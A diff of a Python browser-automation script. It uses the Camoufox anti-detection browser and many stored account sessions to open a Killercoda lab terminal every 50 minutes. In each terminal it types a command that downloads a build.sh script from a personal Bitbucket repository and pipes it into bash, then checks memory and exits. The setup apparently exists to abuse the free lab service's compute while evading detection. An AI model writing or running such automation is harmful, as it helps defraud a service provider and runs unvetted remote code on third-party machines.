@@ -24,10 +24,7 @@ args = parser.parse_args()
 all_sessions = load_sessions()
 print(f"[+] Loaded {len(all_sessions)} sessions")
 
-if args.s is not None:
-    sessions = [all_sessions[args.s - 1]]
-else:
-    sessions = all_sessions
+sessions = [all_sessions[args.s - 1]] if args.s is not None else all_sessions
 
 LAB_URL = "https://killercoda.com/course-cnpe/scenario/playground"
 COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/b0d467b192aac8ff15945685142c57ad8d39c8ca/build.sh' | bash", "free -m"]
@@ -41,7 +38,6 @@ with Camoufox(
     block_webrtc=True,
     locale="en-US",
 ) as browser:
-    # Create contexts/pages once, reuse them across iterations
     pages = []
     for s in sessions:
         email = s.get("email", "?")
@@ -56,38 +52,17 @@ with Camoufox(
 
     while True:
         for page in pages:
-            # --- prepare the lab ---
             print(f"[+] Navigating to lab: {LAB_URL}")
             page.goto(LAB_URL, wait_until="networkidle", timeout=90000)
-            time.sleep(3)  # let dynamic elements settle
+            time.sleep(3)
 
-            elements = page.query_selector_all("*")
-            dump = []
-            for el in elements:
-                try:
-                    tag = el.evaluate("e => e.tagName.toLowerCase()")
-                    text = el.inner_text().strip()[:200]
-                    attrs = el.evaluate("""e => {
-                        let o = {};
-                        for (let a of e.attributes) o[a.name] = a.value;
-                        return o;
-                    }""")
-                    dump.append({"tag": tag, "text": text, "attrs": attrs})
-                except Exception:
-                    pass
-
-            with open("lab_dump.json", "w") as f:
-                json.dump(dump, f, indent=2)
-            print(f"[+] Dumped {len(dump)} elements to lab_dump.json")
-
-            # --- debug: find terminal frame ---
-            print("[+] Waiting for terminal frame to load...")
+            # Find terminal frame
+            print("[+] Waiting for terminal frame...")
             terminal_frame = None
-            for attempt in range(60):  # up to 5 minutes
+            for attempt in range(60):
                 for frame in page.frames:
                     try:
-                        el = frame.query_selector("#terminal-container")
-                        if el:
+                        if frame.query_selector("#terminal-container"):
                             terminal_frame = frame
                             break
                     except Exception:
@@ -114,88 +89,30 @@ with Camoufox(
                     print(f"[+] Sent: {cmd}")
                     time.sleep(2)
 
-                # Dump all elements and search for discord/logout
-                time.sleep(3)
-                all_elements = page.query_selector_all("*")
-                dump = []
-                keywords = ["discord", "logout", "log out", "sign out"]
-                for el in all_elements:
-                    try:
-                        tag = el.evaluate("e => e.tagName.toLowerCase()")
-                        text = el.inner_text().strip()[:200]
-                        attrs = el.evaluate("""e => {
-                            let o = {};
-                            for (let a of e.attributes) o[a.name] = a.value;
-                            return o;
-                        }""")
-                        entry = {"tag": tag, "text": text, "attrs": attrs}
-                        dump.append(entry)
-                    except Exception:
-                        pass
-
-                with open("post_cmd_dump.json", "w") as f:
-                    json.dump(dump, f, indent=2)
-                print(f"[+] Dumped {len(dump)} elements to post_cmd_dump.json")
-
-                matches = [e for e in dump if any(k in (e["text"] + str(e["attrs"])).lower() for k in keywords)]
-                print(f"[+] Found {len(matches)} element(s) matching discord/logout:")
-                for m in matches:
-                    print(f"    <{m['tag']}> text={m['text']!r} attrs={m['attrs']}")
-
-                # --- Click "Exit Scenario" ---
+                # Click Exit Scenario
                 try:
-                    print("[+] Clicking Exit Scenario button...")
-                    exit_btn = page.wait_for_selector("[title='Exit Scenario']", timeout=10000)
-                    exit_btn.click()
+                    page.wait_for_selector("[title='Exit Scenario']", timeout=10000).click()
                     print("[+] Clicked Exit Scenario")
                 except Exception as e:
                     print(f"[-] Exit Scenario button not found: {e}")
 
-                # Wait, dump, search for EXIT, click it
-                time.sleep(3)
-                exit_elements = page.query_selector_all("*")
-                exit_dump = []
-                for el in exit_elements:
-                    try:
-                        tag = el.evaluate("e => e.tagName.toLowerCase()")
-                        text = el.inner_text().strip()[:200]
-                        attrs = el.evaluate("""e => {
-                            let o = {};
-                            for (let a of e.attributes) o[a.name] = a.value;
-                            return o;
-                        }""")
-                        exit_dump.append({"tag": tag, "text": text, "attrs": attrs, "el": el})
-                    except Exception:
-                        pass
-
-                with open("exit_dump.json", "w") as f:
-                    json.dump([{k: v for k, v in e.items() if k != "el"} for e in exit_dump], f, indent=2)
-                print(f"[+] Dumped {len(exit_dump)} elements to exit_dump.json")
-
-                exit_matches = [e for e in exit_dump if "exit" in (e["text"] + str(e["attrs"])).lower()]
-                print(f"[+] Found {len(exit_matches)} element(s) matching EXIT:")
-                for m in exit_matches:
-                    print(f"    <{m['tag']}> text={m['text']!r} attrs={m['attrs']}")
-
+                # Confirm exit dialog
                 try:
-                    ok_btn = page.wait_for_selector("button.dg-btn.dg-btn--ok.dg-pull-right", timeout=5000)
-                    ok_btn.click()
-                    print("[+] Clicked Exit confirmation button")
+                    page.wait_for_selector("button.dg-btn.dg-btn--ok.dg-pull-right", timeout=5000).click()
+                    print("[+] Clicked Exit confirmation")
                 except Exception as e:
-                    print(f"[-] Could not click Exit confirmation button: {e}")
+                    print(f"[-] Exit confirmation not found: {e}")
 
                 # Accept cookies if banner appears
                 try:
-                    accept_btn = page.wait_for_selector(
+                    page.wait_for_selector(
                         "button:has-text('Accept'), button:has-text('Accept all'), button:has-text('Accept cookies'), [id*='accept'], [class*='accept']",
                         timeout=5000
-                    )
-                    accept_btn.click()
+                    ).click()
                     print("[+] Accepted cookies")
                 except Exception:
                     pass
 
-        # Sleep 60 minutes then repeat
         print("[+] Sleeping 60 minutes before revisiting...")
-        time.sleep(60 * 60)
+        time.sleep(50 * 60)
         print("[+] Revisiting lab URL...")
